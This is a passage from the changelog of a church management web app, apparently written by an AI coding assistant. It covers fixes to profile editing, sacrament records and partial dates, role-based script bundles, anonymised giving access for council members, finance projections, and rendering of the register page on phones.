`manual.html` are American English.** This is a church in St. Louis writing to its own staff and
congregation; "colour" or "behaviour" on an admin screen reads as a typo to every one of them.

161 occurrences swept across `src/`, `test/`, `NOTES.md` and `CLAUDE.md` — almost all comments
and test names, plus a handful of real user-visible strings: the giving letter's "care for our
neighbours", the health-plan card's "at the enrolment below", and the MDO import blurb's
"categorises them". `npm test` (1285/1285), unchanged.

**⚠ The sweep is case-sensitive and word-bounded, and both of those are load-bearing.**
Case-insensitive matching reads `outsideFence` as containing "deFence"; without word boundaries,
`yourcentre` and every base64 blob become hits. Four things were left alone deliberately and are
recorded in `CLAUDE.md` with the reason: `aria-labelledby` (an HTML attribute — renaming it
silently unlabels the element for a screen reader, with nothing to see in a browser),
`auth/cancelled-popup-request` (a Firebase error code compared by string), `vendor/**`, and
`migrations/*.sql` (a record of what actually ran against live D1). So are the words that only
look British: `analysis`, `analyses`, `analyst`, `optimistic`, `realistic`, `programmed`.

`CLAUDE.md` carries the grep that checks it. It returns nothing today.

### v1.169.0 — "Save failed" root-caused: it was a DOM re-entrancy crash (2026-08-12)

The v1.168.0 diagnostic did its job. The alert now reads: *"Failed to set the 'innerHTML'
property on 'Element': The node to be removed is no longer a child of this node. Perhaps it
was moved in a 'blur' event handler?"* — **not a server error at all, and the PATCH had
already succeeded.**

Mechanism: `pvfCancel()` swaps the cell back to read-only by assigning `innerHTML`. That
removes the control inside it, and if the control still has focus **the browser fires `blur`
synchronously, part-way through the assignment**. The blur handler calls `pvfCommit` →
`pvfCancel` → a *nested* `innerHTML` assignment while the outer one is still running, which
is the DOMException. It then propagated out of the `.then` into the `.catch`, producing
"Save failed" over a save that worked.

**Why gender and marital status specifically**: they are `<select>`s, which commit from
`onchange` and so are still focused at that moment. A text input commits from `onblur`,
by which time focus has already left — so the same code path never tripped there.

Fixed at both levels: a re-entrancy guard inside `pvfCancel` (the invariant that actually
matters — no nested assignment), and `_pvfCommitting[id]` now cleared *after* the re-render
rather than before, so the re-entrant `pvfCommit` is turned away at the door.

**Backfill, as requested**: baptized/confirmed set to yes for anyone already carrying a
date. The statements existed in `_doInitDb` and are now documented and pinned by tests —
`=0` not `!=1` on purpose, so an explicit "No" is never overwritten by a contradictory date;
partial dates count. Editing `_doInitDb` changes the schema fingerprint, so this re-runs on
deploy.

`npm test` (1241/1241, 6 new). **My first version of the re-entrancy test was vacuous** and
was rewritten: it drove the whole commit, where either guard alone prevents the crash, so
removing either one still passed. The two guards are now pinned by separate tests that fail
independently (2 injections, 2 correct failures; 4 more for the backfill and ordering).
**A backtick in one of my own new comments closed the outer `String.raw` literal** — the
SC3-BUG1/FIN15 class for the third time in this series, caught by the build. **Not
verified**: a live browser.

### v1.168.0 — The same work, on the profile that is actually on screen (2026-08-11)

A screenshot of the real People view showed v1.167.0 had changed nothing there. **I edited the
wrong renderer.** The profile has two implementations: the legacy per-section editors
(`pvEditDemo`/`pvSaveDemo` and their Contact/Notes/Tags siblings — a whole-card Edit-then-Save
panel writing a full-row PUT), and the `pvf*` field registry the card layout actually uses,
where one value is clicked and PATCHed on its own. The `#pv-*-section` containers the legacy
editors write into **had already been dropped from the markup**, so all four were dead — and
last version's sacrament UI went into one of them.

- **The dead editors are deleted** (264 lines), not left alongside. Their presence is what
  caused this: they look like the live profile editor and are the obvious thing to change.
  `syncPersonAddrToHousehold` was the one live function tangled in that block and is kept —
  its success path called the removed `pvRenderContact()` and now shows the saved-toast.
- **Baptized / Confirmed are now fields in the registry** (Yes · No · Not recorded), sitting
  above their date rows in Demographics. `0` renders through the card's usual gray "Not set"
  via a new `blankVals`, so an unanswered field never reads as an answered one.
- **The inline date editor gained the precision select.** Two controls in one cell means
  tabbing from the picker to the select fires blur, and committing there would tear the select
  out from under the click — `pvfDateBlur` defers a tick and only commits once focus has
  actually left the cell.
- **Real display bug fixed**: `pvfYearsAgo` parsed the month/day-only sentinel as a real year 1,
  so a baptism the card printed as "Jul 31" carried "**2024 years ago**" underneath it.
- **`pvfCommit`'s catch is the alert that was reported** — the live one, where last version I
  fixed the dead twin. It now carries the reason. Worth knowing: that catch also fires when the
  save *succeeded* and something later in the `.then` threw, which reads as data loss that
  didn't happen.
- **Version number**: `#deploy-ver` is in the topbar, the first row a narrow screen squeezes.
  Added to the sidebar bottom under Settings, where it is findable.
- Driving the real shipped bundle over gender / marital status / first name against a 200
  response produced **no alert**, so the reported failure is a genuine non-JSON response and
  still not reproducible from here — the message now names it.
- `npm test` (1235/1235, 37 in the file — the legacy-path tests retargeted at the live one);
  every test verified non-vacuous by injecting the exact regression it guards (7 injections).
  **One of my own tests was vacuous and was rewritten**: the blur-guard test asserted "no
  request sent" while leaving the value unchanged, so `pvfCommit` returned early on its own and
  the test passed against a deliberately removed guard. A test assertion also caught a bare `&`
  emitted in an option label; the source was fixed rather than the test. **Not verified**: a
  live browser.

### v1.167.0 — Sacramental yes/no, partial dates, and two data-loss bugs (2026-08-11)

Reported together: baptized/confirmed could no longer be marked yes or no without a date,
or to only a year, or to only a month/day; saving gender or marital status alerted "Save
failed"; and a person created inside a household got no address.

**Sacramental status is tri-state.** `baptized`/`confirmed` become `0` not recorded / `1`
yes / `2` no. Keeping `0` as "not recorded" is the whole point — every row predating this
is `0`, and repurposing it as an explicit "No" would have handed the entire congregation a
pastoral assertion nobody made. The consequence to remember: **a truthiness test on these
columns reads an explicit No as a Yes**, which is exactly how `api-reports.js`'s pipeline
and the PUT handler would have broken; both compare against `SACRAMENT_YES` now. The
people-filter clauses moved from `=0` to `!=1` so "not baptized" covers both No and unknown
while the four existing options keep their meaning for the 0/1 data. `bulk-sacrament` gains
`'no'`; `'unset'` still clears back to not-recorded, which is what it always meant.

**Partial dates.** Alongside the existing `0001-MM-DD` (month/day known), a year-only
`YYYY-00-00`. Every date field now carries an Exact date / Month & day only / Year only
select in place of the "Year unknown" checkbox. SQLite's `strftime()` returns NULL for both
sentinels, so the birthday and baptism-anniversary queries skip these rows on their own
rather than printing an invented day on a bulletin; the Breeze reverse-sync skips them too,
since Breeze cannot express the precision and would store one as exact.

**The Add/Edit Person modal had no yes/no control at all** — only the profile's inline
editor did, which is likely most of what "I used to be able to" is about. It has one now,
and `POST /people` records the flags, which it silently dropped before: a person added with
a baptism date was stored as not baptized.

**Two data-loss bugs, both in the reported save path.** `pvBuildPersonPatch` omitted
`middle_name`, `preferred_name`, `photo_url` and `sms_opt_in` — and `PUT /people/:id`
replaces the whole row from the body, so **editing gender from the profile erased that
person's photo, preferred name and SMS opt-in**. A test now derives the required field list
from the PUT's own SET clause rather than restating it. Separately, `api()` only rejects on
a 401, so a server-side error arrived at `pvSaveDemo` as a resolved `{error}` body and was
reported as a bare "Save failed" with the reason discarded — **the alert now carries the
server's own message**, which is what a recurrence needs to be diagnosable.

**Household address prefill.** Creating a person from Add Person to Household inherits the
household row's address (not a member's, so it doesn't depend on which member is complete),
and the panel names the address that will be applied instead of doing it invisibly.

`npm test` (1230/1230, 32 new in `test/person-sacrament-partial-dates.test.js`, running the
real shipped bundles in a `vm` and the real handlers against real in-memory SQLite); **every
new test verified non-vacuous** by injecting the exact regression it guards (6 injections, 6
correct failures). Plus `node --check` on all three bundles and the touched backend modules,
`app.css` brace balance, div balance on the shell and on `#person-modal`. **A backtick in
one of my own new comments closed the outer `String.raw` literal** — the SC3-BUG1/FIN15
class again, caught by the build, not by reading. Dead `pmYearUnknownChanged` removed (zero
call sites once the checkboxes went). **Not verified**: a live browser or real D1 — so the
reported "Save failed" is fixed in the two places it was reproducible (the wiped fields, the
swallowed reason) but its exact server-side trigger was never observed from here.

### v1.166.0 — Member sessions get a member-sized bundle (2026-08-11)

Asked while preparing to invite members at scale (TLY1): the member tier only reaches People, so
does it load faster? **No — it never did.** Role gating here is *visibility*, not payload:
`applyRoleUI()` sets `role-member` on `<body>` and CSS hides the tabs, but `/admin/app-core.js`
and `/admin/app-ext.js` are `immutable` and shared across every user, so by construction they
cannot vary by role. A member downloaded the same ~1.8 MB as an admin — `js-finance.js` alone is
645 KB of it — on what is typically a phone, on cell data, opened from the Tithe.ly app tab.

**The split.** The one per-request, `no-store` surface is the shell, so that is where the role
decision has to live. `app-core.js` is cut along the role line:

| bundle | modules | size |
|---|---|---|
| `app-member.js` | core + people + households | 263 KB |
| `app-staff.js` | settings + dashboard + register | 124 KB |
| `app-ext.js` | unchanged | 1,244 KB |

A member is served `app-member.js` alone; every other role gets all three, in that order — the
same total bytes as before, in three files instead of two. **First load: 606 KB for a member
against 1,974 KB before.** The ongoing win is arguably bigger: both JS files hang off one
`?v=DEPLOY_VERSION`, so every Finance deploy used to re-download Finance to every member.

**Three things worth carrying forward:**

1. **`_memberTypes` / `loadMemberTypes()` / `refreshMemberTypeSelect()` moved from
   `js-settings.js` into `js-core.js`.** They were never settings code — `loadMemberTypes()` runs
   unconditionally in the boot handler for every role, and the People filter chip and the
   person-edit `<select>` both read `_memberTypes`. Left in place, the member bundle threw a
   ReferenceError at boot. Found by a test, not by reading, and it is the entire failure class
   this split introduces.
2. **Reports is lazy, not missing.** Member Reports is `none` by default but an admin can grant
   it, so `showTab('reports')` now goes through `ensureFullAppLoaded()` (same shape as the
   Scheduler lazy-load), which pulls **both** remaining bundles — `js-reports` calls into
   `js-attendance` (`_buildAttYoYHtml`, `_chartResizeHandle`, `MONTH_NAMES`), so fetching ext
   alone would trade one ReferenceError for another.
3. **`chmsHtmlForRole()` fails safe, not small.** An unrecognized or null role gets all three.
   Under-serving scripts to a staff account breaks their app; over-serving to a member costs
   bytes. Pinned by a test.

**Order changed**: people/households now parse before settings/dashboard/register. Safe only
because no module calls another's function at parse time — the sole top-level statements across
the six are listener registrations, and js-core's boot work is inside a `load` handler. A test
also asserts no top-level name is defined twice across the three bundles, since they still share
one global scope.

`npm test` (1198/1198, 21 new in `test/member-bundle.test.js`, running the real shipped bundles in
a `vm` with a fake DOM). **Every new test verified non-vacuous** by injecting the exact regression
it guards — 6 injections, 6 correct failures. One of my own tests was weaker than its own comment:
"evaluates standalone" cannot catch a missing global, because that only throws when it *runs*, so
the boot test was rewritten to **extract the boot call list out of the shipped source** and
execute each one, honoring the existing `_userRole !== 'member'` guard on `loadFunds` rather than
demanding it be present. `test/asset-cache-policy.test.js` and `test/service-worker.test.js`
hardcoded `/admin/app-core.js` and were updated to the new names. Plus `node --check` on all three
bundles and the worker, `app.css` brace balance, div balance on both shells. **A backtick inside
one of my own new comments closed the outer `String.raw` literal and broke the whole module** —
the SC3-BUG1/FIN15 class again, caught by the build rather than by reading the diff.

**Not verified**: a live browser, a real phone, or an actual member session. Two follow-ups logged
in CLAUDE.md: CR9a (the shell is still 193 KB of all-tabs markup — CR1b, for which the member tier
is now the strongest argument) and CR9b (`html-head.js` ships the role-visibility CSS block twice,
~2 KB, byte-identical).

### v1.165.1 — Attendance entry no longer runs off the side of a phone (2026-08-10)

Reported with a screenshot from an iPhone: on Attendance → This Week the **8:00 field filled the
screen, 10:45 sat past the right edge, and recording a Sunday meant panning the whole page
sideways**. The pulse card below was cut off for the same reason.

**Cause — and it is not the two-column grid.** `.att-input-grid` is `grid-template-columns:1fr 1fr`,
but a `1fr` track is really `minmax(auto, 1fr)`, and that `auto` minimum is the item's
**content-based minimum size**. For an `<input>` with no `width`/`size` attribute that minimum comes
from the HTML default `size` of **20 characters** — and `.att-input` is deliberately `1.65rem`
(~26px, MOB1 restores it on phones on purpose for thumb-friendly entry). So each field demanded
roughly 300px, the pair could not fit any phone, the card refused to shrink, and **the page grew
instead**. `box-sizing:border-box` does not help here: the overflow is an intrinsic minimum, not
padding arithmetic.

**Fix**: `min-width:0` on the grid children (plus the input itself), which is what lets a fraction
actually be a fraction. Also applied to `.att-row2 > *` / `.att-row2b > *` so the same class of bug
cannot widen the page from any other attendance card's contents. Phone-only padding trim on top —
88px of panel+card chrome out of a 320px viewport was a third of the width the two fields had to
share; desktop spacing is untouched.

**Deliberately not done**: stacking the fields on phones. That fixes the scroll too, but pushes
Combined and Save Sunday down the page, and reading both numbers plus the total in one glance is
the entire point of the card. They stay side by side at every width — a test asserts it. Also not
done: `overflow-x:auto` on the card, which is the same problem in a smaller box.

**Caught by the harness, not by reading**: the first draft of the CSS comment used backticks
around `min-width:auto` and `1fr`, which closed the file's outer `String.raw` literal and broke the
whole stylesheet module — the SC3-BUG1/FIN15 class, recurring exactly as documented.

`npm test` (1177/1177, 13 new in `test/attendance-mobile.test.js`); **every new test verified
non-vacuous** by injecting the exact regression it guards (5 injections, 5 correct failures —
removing the fix, stacking instead, a `size` attribute breaking the modeled premise, trimming
padding globally, and "fixing" it with `overflow-x:auto`). Plus `node --check` on both built
bundles, a brace-balance scan of the real served `/admin/app.css` (the stylesheet has not been
inlined in `CHMS_HTML` since CR1 — check the built `CHMS_APP_CSS`, not the page), a div-balance
scan of `CHMS_HTML`, and confirmation that all five new declarations reach the served CSS.
**Not verified**: a real phone. (`src/frontend/html-head.js`, `test/attendance-mobile.test.js`)

### v1.165.0 — The `office` role becomes `council`, and giving it can see is anonymous (2026-08-10)

Two changes, one role. `office` is renamed **`council`**, and the council tier now sees the
church's financial picture — the Finance workspace and the Reports tab — with giving readable
**only in aggregate**. A council member can see what the congregation gave; never who gave it.

**A new permission level, not a new role flag.** `giving` gains **`anon`**, sitting between
`none` and `view` in the existing tri-state matrix (`api-utils.js`). Making it a level rather
than a side-car boolean means it flows through the same `resolveRolePermissions` →
`permissionsForRole` → central `ACCESS_GATE` path everything else already uses, and it shows up
in Settings → Role Permissions as a third option on the Giving row — *Totals only (no names)* —
so an admin can move council up to full giving access, or down to none, without a code change.
`anon` is meaningless on the other seven items and is normalized to `none` there, so a
hand-crafted config can't create an undefined state.

**Enforcement is an allowlist at one chokepoint, deliberately.** `isAnonSafeGivingSeg()` names
the eight aggregate endpoints an anon role may call — `giving/stats`, `reports/giving-summary`,
`-by-method`, `-trend`, `-multiyear`, `-distribution`, `-vs-attendance`, `-board`. Every giving
route reaches its handler through the gate in `handleChmsApi`, so **a giving endpoint added
later is unreachable for council until somebody reads it and decides it names nobody**. A
denylist would have failed the other way round, and the failure mode there is a donor's name.
Refused accordingly: batches, transactions, deposits, quick entry, letters/nudges/receipts,
statements, `giving-insights` (top + lapsed givers), `giving-yoy`, `giving-plateaus`,
`giving-bands`, and reconcile-diagnose. Writes are refused on the allowlisted endpoints too.

**⚠ Individual giving also surfaces outside the giving routes, and that is the easy thing to
miss.** `isFinance` — threaded into the people, reports and import handlers — used to mean
"`canView('giving')`", which is *true* for anon. It now means "may see an individual's giving"
and is false for anon, which is what keeps `giving_12mo` off the person profile and the
First-Time Givers list off the dashboard. The three General Fund dashboard totals are
congregation-wide sums and read the separate `canViewGivingSums` instead, so council keeps them.
The two aggregate reports that self-check (`giving-trend`, `giving-yoy`) take `givingAnon`
explicitly rather than being loosened.

**Front end mirrors it, but is not the enforcement.** A new `.require-giving-named` class marks
the twelve donor-naming surfaces — the Offerings and Communications sub-nav entries and panels,
the Statement/Insights/Trends/Letters tiles, the Plateaus and Bands cards, and the person
profile's Giving tab — hidden by `applyPermissionUI()` and by a `body.perm-giving-anon` CSS rule
for anything rendered afterwards. `givSetView()` sends an anon role's Offerings/Communications
deep links to Reports, so a stale bookmark lands somewhere real instead of on a blank panel.

**Existing accounts move automatically.** `_doInitDb` runs `UPDATE app_users SET role='council'
WHERE role='office'` (also `migrations/0035_role_office_to_council.sql`) — without it an account
left on `office` would resolve to an empty permission row and lose access outright.
`resolveRolePermissions` reads a pre-rename stored `office` config row as council's, so an
admin's existing configuration survives; the first save after the rename replaces the key.

**Register access is preserved, not re-decided.** Council keeps the register edit the old office
role had. This is a rename plus an addition — silently narrowing what existing accounts could do
is a separate decision, and it is one checkbox away in Settings either way.

`npm test` (1164/1164, 30 new across `test/giving-anon-gate.test.js`,
`test/role-permissions.test.js` and `test/giving-consolidation-ui.test.js`); the gate tests drive
the real `handleChmsApi` against a mock DB that throws a sentinel on any query past the config
read, so "this endpoint IS reachable" is proven by the request exploding rather than by the
absence of a 403. **Every new test verified non-vacuous** by injecting the exact regression it
guards (eight injections, eight correct failures) — one of them found a real hole: the first pass had
no coverage of `isFinance` being strict for anon, i.e. the person-profile leak, so the
recording-DB tests asserting the giving query is never *issued* were added for it. Plus
`node --check` on both built bundles and a div-balance scan of the assembled `CHMS_HTML`.
**Not verified**: a live browser or real D1. (`src/api-utils.js`, `src/api-chms.js`,
`src/api-reports.js`, `src/api-admin.js`, `src/api-import.js`, `src/db.js`,
`migrations/0035_role_office_to_council.sql`, `src/frontend/{js-core,js-giving,js-settings,js-dashboard,html-head,html-tabs}.js`)

### v1.164.0 — Ivanhoe: capital input fixed, combined basis, and the tab's figures reconciled (2026-08-08)

Four things off a live screenshot of the Commercial Property tab at v1.163.0.

**1. The capital assumption box accepted one character at a time — my own bug from the day before,
and a textbook repeat of FIN52.** `finRenderCapitalAssumptionEditor` was appended INSIDE
`finRenderProFormaBody`, whose output fills `#fin-proforma-out`, and `finValRecompute()` rewrites
that container's `innerHTML` on every keystroke — destroying and recreating the field being typed
in. Fixed by rendering the editor as a **sibling** in its own `#fin-capital-assumption` container,
and splitting the handlers: the number fields call `finCapAssumptionChanged()`, which updates only
derived readouts and the walk above; only the basis `<select>` calls `finCapBasisChanged()`, which
may redraw the editor because a select has no caret to lose. **The rule worth keeping: the
container holding a live input must never be the container a recompute rewrites.**

**2. Combined basis added** (`flat_plus_sqft`): a flat base plus a $/SF rate. Unlike the pure
`per_sqft` case it deliberately does NOT fall back when square footage is missing — the flat figure
is a real entered number, so the assumption stands and the editor warns that the rate is
contributing nothing.

**3. "Still available" was double-counting a distribution already taken.** The hero showed AHRA's
$9,321.77 then subtracted the $4,000 taken in 2026, giving $5,321.77. But AHRA's figure is cash in
the bank **as of the 2026-06 report**, and the $4,000 was paid in **2026-04** — that money had
already left the account before AHRA counted it. New `finComputeDistributionsAfter()` subtracts
only distributions dated **after** the report period, so today's figure reads $9,321.77 and a
payment recorded after the latest report is still correctly deducted. The "already taken" tile
stays, relabeled so it no longer reads as a deduction.

**4. Root cause behind the tab looking self-contradictory: FIN57 orphaned FIN44's reconciliation
copy.** `finRenderAvailableForDistributionBar` had been **dead code** — defined, called from
nowhere — since the FIN57 redesign replaced it with `finRenderPropertyDistributionHero`. FIN44 had
written explanatory copy on that bar specifically to stop these figures reading as contradictory
(why "Reserves On-Hand" is a balance including the base-minimum cushion while the funds-itself card
shows only this year's contributions; why a one-month cash figure never equals a full-year
accrual). **The figures did not start disagreeing — the explanation was deleted and the figures
were left to look like they disagree.** That copy is rehomed onto the hero and the funds-itself
card, each figure now states its own basis, the funds-itself card names how much of its total has
already been distributed, the cash walk says it is a forward projection for a different year, and
the dead bar is deleted. **No arithmetic changed except item 3** — these are labeling fixes, and
changing a correct number to make two cards agree would be the worse bug.

**Verification.** `npm test` (1134/1134, 12 new). **Every new test verified non-vacuous** by
injecting the exact regression it guards — 5 injections, 5 correct failures. **One of my own tests
was vacuous and was rewritten**: the structural check that the editor is not nested inside the
recompute container only compared string positions, which stays true when it IS nested, so it
passed against the very bug it existed to catch; it now walks the div nesting for real and fails
correctly. The keystroke path is driven through the real built bundle character by character,
asserting the field object is never swapped and its value accumulates. Plus `node --check` on both
bundles, div-balance on `CHMS_HTML` (1080/1080), and tag-balance across all six rendered property
surfaces in admin and viewer states. **Not verified**: a live browser or a real phone.
(`src/frontend/js-finance.js`, `test/finance-property-proforma.test.js`,
`test/finance-property-distribution.test.js`)

### v1.163.0 — Ivanhoe: the capital allowance becomes an editable assumption (2026-08-07)

Reported off the Commercial Property cash walk: the capital allowance is derived from past spend,
but those were one-time projects and should not be projected forward ("we won't put HVAC in every
year"). Correct, and the ledger shows exactly why — a 2024 apartment renovation ($8,273.75), a
2025 HVAC replacement ($7,787.00) and a washer/dryer hookup ($8,000.00), three finished projects
totalling $24,060.75 over their own 19-month span, i.e. **~$15,196/yr charged in perpetuity**.
That single assumption was most of why 2027 read as deeply negative.

**One resolver, because the alternative was already happening.** `finComputePropertyCapitalAllowanceCents`
is now the single place the assumption is decided, reading `meta.capital`:

| `method` | resolves to |
|---|---|
| `flat` | `annual_allowance_cents` |
| `per_sqft` | `per_sqft_cents` x the rent roll's leasable area (13,535 SF here) |
| `ledger` (default) | the historical average, with `source` saying so |

The ledger-average maths moved unchanged into `finComputePropertyCapitalLedgerAverage`, keeping
another session's same-day hardening of the loose `entry_date` parsing (bare `YYYY` used to make
the month arithmetic NaN).

**A real drift, found by a test and fixed.** A parallel session reached the same conclusion about
the ledger average and hardcoded `finComputeRemittableForecast`'s default to **$0** — right about
the diagnosis, but applied in that one function, while the Commercial Property pro forma still fell
back to the average. Planning and Property would have quoted **different cash for the same year**
($0 vs $15,196 of capital). Both now read the resolver. Per the church's own decision, an unset
assumption still falls back to the ledger average — but visibly: the resolver's `source` drives
copy naming it as one-time project history rather than a forecast, everywhere it prints. The test
that pinned the old $0 default was rewritten with that reasoning recorded, not deleted.

Planning's `_finPmfCapitalCents` was likewise hardcoded to `0`; it is now a null sentinel resolving
to the saved assumption, so the box seeds from the real figure and a typed value stays a live
what-if on top of it.

**Two silent failures deliberately closed.** A `$/SF` rate with no square footage recorded would
resolve to a confident **$0** — a real cost quietly deleted from the cash walk; it now falls back
to the ledger and says which happened, with a warning box. And because the rent roll is edited
live in the same card, `finComputePropertyProForma` passes the LIVE roll's square footage into the
resolver — otherwise typing a new SF figure would move the valuation and leave the capital line
stale.

**Where it is edited:** in the cash-walk card beside the line it drives, not on a settings screen
away from its consequence — a basis picker, the one input that basis needs, a live
"$0.20/SF x 13,535 SF = $2,707/yr" readout, and the spending history named as history. Admin-only;
a non-admin sees the figure and its basis with nothing to change it. Backend is one word:
`'capital'` added to the meta `PATCH` section allowlist. No schema change, no new endpoint.

**Verification.** `npm test` (1122/1122, 10 new). **Every new test verified non-vacuous** by
injecting the exact regression it guards — `per_sqft` resolving to $0 with no square footage, the
remittable forecast ignoring the saved assumption, live square footage not plumbed through, a
deliberate `$0` treated as unset — 4 injections, 4 correct failures, each caught by the test that
names it. Plus `node --check` on both built bundles and `api-finance.js`, and editor tag-balance
across all three bases x admin/viewer. Run end to end against the real seeded ledger, 2027 cash:

| assumption | capital | cash to the church |
|---|---:|---:|
| ledger average (today) | $15,196.26 | **−$11,687.43** |
| flat $0/yr | $0.00 | **+$3,508.83** |
| $0.20/SF/yr | $2,707.00 | **+$801.83** |

Planning and Property agree in every case. **Not verified**: a live browser or real D1.

**One step for an admin:** open Commercial Property, expand *Capital allowance assumption*, and set
the real figure. Until then the card still shows the flagged ~$15,196 historical average.
(`src/frontend/js-finance.js`, `src/api-finance.js`, `test/finance-property-proforma.test.js`,
`test/finance-property-remittable.test.js`)

### v1.161.0 — Giving pace finds the uploaded budget; runway is church operations only (2026-08-07)

Two problems reported off one live screenshot of Financial Health.

**1. "No budget is on file for the General Fund accounts" against a budget that IS uploaded** and
visible on the Planning tab. Two independent ways the lookup could lose a real budget, both fixed:

- The code was read only off a fund literally NAMED "General Fund" (`resolveGeneralFundIds`). Once
  an admin has categorized funds by hand (Settings → Fund categories) that name need not survive,
  and a null code silently cost the whole lookup. It now falls back to the leading code the
  categorized general funds themselves share (most common wins).
- The ledger side matched the code only against `account_name`. Importers disagree about where the
  code lands — leaf name for some ("40085 Sunday Offering"), an ancestor path segment for others
  ("40085 Offerings:Sunday Offering") — so a budget uploaded through one importer read as absent.
  Both are checked now, with the character after the code required to be a non-digit, so "40085"
  can never match "400851".

The rule is now one exported function, `resolveGeneralFundBudget` in `api-utils.js`, shared by the
board report's General Fund card and the Health page's pace chart — the previous inline copy in
`api-reports.js` is gone, so the two cannot quote different targets.

**The card now says what it searched for.** "No budget is on file" is not something a reader who
can see the budget on another tab can act on. It names the account code it looked under, says
whether that code was pinned by an admin, and points at where to pin a different one; when a budget
IS found it names the ledger accounts the pace line came from, same as the cash card names its
account. New **General Fund budget account code** field under Data & Imports → Classification &
policy (`finance_cash_policy.general_fund_budget_code`) for the case where Giving and the ledger
file the offering under different codes.

**2. Operating cash runway counted daycare expenses in the burn rate.** Per the church: if the
tuition stops, the wages stop with it — daycare is not a cost the congregation has to carry out of
reserves. New pure `computeOperatingExpenseSplit()` (`api-finance.js`) splits Expenses using the
same `MDO_MATCH_RE` the daycare importer and `computeMoneyFlow` already key on, so "daycare" means
exactly the account set the Daycare Report is built from and the two halves always sum back to
total expenses. The runway is now the church half only — salaries, property, everything the
congregation keeps paying. The card says "average month of **church operations**" and names the
daycare figure it left out, so a reader comparing against the Church Report's total sees the
difference accounted for rather than assuming one screen is wrong.

`npm test` (1071/1071, 12 new). **Every new test verified non-vacuous** by injecting the exact
regression it guards — six injections, six correct failures (path matching, digit guard, code
fallback, pinned code, daycare in the burn rate, the daycare note). Plus `node --check` on both
built bundles and a div-balance scan of the assembled `CHMS_HTML`. One existing test changed rather
than the code: it pinned the old "No budget is on file" copy, which was the defect.

**Not verified**: a live browser or real D1. **Follow-up for an admin**: if the pace card still
draws no line, it now names the code it searched — put the ledger's real offering code in
*General Fund budget account code* under Data & Imports → Classification & policy.
### v1.162.0 — Register crashed the iOS renderer; found from the real error message (2026-08-07)

**Version-number collision worth knowing about:** two sessions merged the same day both labeled
themselves `v1.161.0` — the register-on-a-phone fix and the Finance Health budget/runway fix. The
second merge therefore did **not** change `DEPLOY_VERSION`, and that string is the cache-busting
query param on `/admin/app-core.js`/`/admin/app-ext.js`, so a returning visitor holding the first
deploy's cached bundle would never have been served the second one. This 1.162.0 bump busts the
cache and carries both live. Nothing to undo; flagged because concurrent branches bumping to the
same number is a silent-staleness trap this repo has hit before.

The follow-up screenshot named the actual failure and it was **not** what v1.161.0 fixed: iOS's
**"A problem repeatedly occurred on https://connect.timothystl.org/#register"** — the web content
process being killed and re-killed, not a JS exception. That is why the global error banner never
showed anything and why no amount of reading `filterRegister()` was going to find it.

**Cause: unbounded render, rebuilt per keystroke.** `GET /admin/api/register` is
`SELECT * FROM church_register` with no `LIMIT`, and `renderRegisterList()` drew every row it was
handed. Measured against a realistic scanned historical register (every extended field populated,
as the PDF import leaves them), by running the real shipped renderer out of the built bundle:

| entries | HTML | DOM elements |
|--------|------|--------------|
| 200    | 0.33 MB | 6,420 |
| 1,000  | 1.51 MB | 25,620 |
| 2,500  | 3.71 MB | 61,620 |
| 5,000  | 7.38 MB | 121,620 |

...and the search box called `filterRegister()` on **every keystroke with no debounce** (the People
tab has had `debouncePeople()` at 300ms all along; the register never got one), so each character
typed rebuilt all of it and left the previous few MB for the collector. An in-app browser's
content process has a tighter memory ceiling than Safari proper, which is why it died there.

Three changes, in order of effect:
- **Bounded render window.** `REG_PAGE_SIZE = 250`, with a footer stating *"Showing the first 250
  of 2500 matching entries"* plus **Show more**. Peak DOM is now **flat at 0.26 MB / 7,624
  elements regardless of register size** — 28x less markup than 5,000 entries used to produce, and
  no longer growing. Nothing is silently truncated: a register that quietly stopped at 250 rows
  would read as missing records.
- **`Show all` is only offered below `REG_SHOW_ALL_MAX = 1000`.** Offering it unconditionally would
  put the crash one tap away — the fix would have shipped with its own footgun. **Show more** still
  reaches every entry, a page at a time.
- **Debounced search** (`debounceRegister()`, 250ms) and per-row markup moved from repeated inline
  `style=` attributes to CSS classes (~1.5KB → ~0.9KB per row; declarations carried over verbatim
  and pinned by test). `regFilteredEntries()` is now the single filter shared by the screen and
  `printRegister()`, which had a hand-copied duplicate — print deliberately uses the FULL match
  set, never the capped window.

**Known, not fixed:** the endpoint still returns every row, because client-side search and the
year filter need them. At ~300 bytes of JSON per row that is far below the DOM cost that was
actually killing the renderer, but a register that grows into five figures would want a real
server-side page. Flagged rather than pre-emptively rebuilt.

`npm test` (1101/1101, 41 in `test/register-mobile.test.js`, driving the real renderer out of the
real built bundle at 200/600/1200/2500/5000 entries). **Every new test verified non-vacuous** by
injecting the exact regression it guards (9 injections across both rounds, all failing correctly).
Two of my own assertions were wrong and were corrected rather than forced — one demanded
byte-identical output across the `Show all` ceiling, i.e. across two different footers. Plus
`node --check` on both bundles, `app.css` brace balance, div-balance on `CHMS_HTML` and the
`#tab-register` subtree. **Not verified**: a real phone. (`src/frontend/js-register.js`,
`src/frontend/html-head.js`, `src/frontend/html-tabs.js`, `test/register-mobile.test.js`)

### v1.161.0 — Church Register was read-only on a phone (2026-08-07)

Reported as errors on the register search on a mobile device. **The search filter itself is not
the bug** — it was driven through the real built bundle against null names, missing dates, `null`
and `undefined` `name2`/`officiant` values and numeric `pdf_page` fields, and never threw; `esc()`
coerces with `String(s||'')`, so the un-stringified `esc(e.pdf_page)` in the row renderer is safe
too. What was broken is what happens *after* a search: you find the entry, tap **Edit**, and
nothing at all happens. Two independent display-state defects, both present since the register
shipped:

1. **`.reg-add-toggle` was a class selector for an element that only has an id.** The phone
   stylesheet revealed the "+ Add" button with `.reg-add-toggle{display:inline-flex !important}`,
   but the button carries `id="reg-add-toggle"` and no class of that name — so the rule matched
   nothing. With `.reg-form-panel{display:none}` on phones and the button hidden by its own
   inline `display:none`, **the add/edit form was unreachable on a phone entirely.** Fixed to
   `#reg-add-toggle`. The `!important` is load-bearing and was already there: an important author
   declaration outranks a normal inline one, which is what defeats the button's inline
   `display:none`.
2. **`style.display = ''` cannot reveal something a stylesheet hides.** `toggleRegForm()` and
   `openRegisterEdit()` both revealed the panel by clearing an inline style — which hands the
   decision back to the `display:none` rule rather than overriding it. `openRegisterEdit()` even
   carried the comment "Ensure form is visible (mobile)" while doing the one thing that cannot
   make it visible on mobile. Both now toggle a `.reg-form-open` class, with a matching
   phone-scoped `.reg-form-panel.reg-form-open{display:block}` rule; the panel also goes
   full-width on a phone instead of keeping its 300px desktop column. Opening scrolls the form
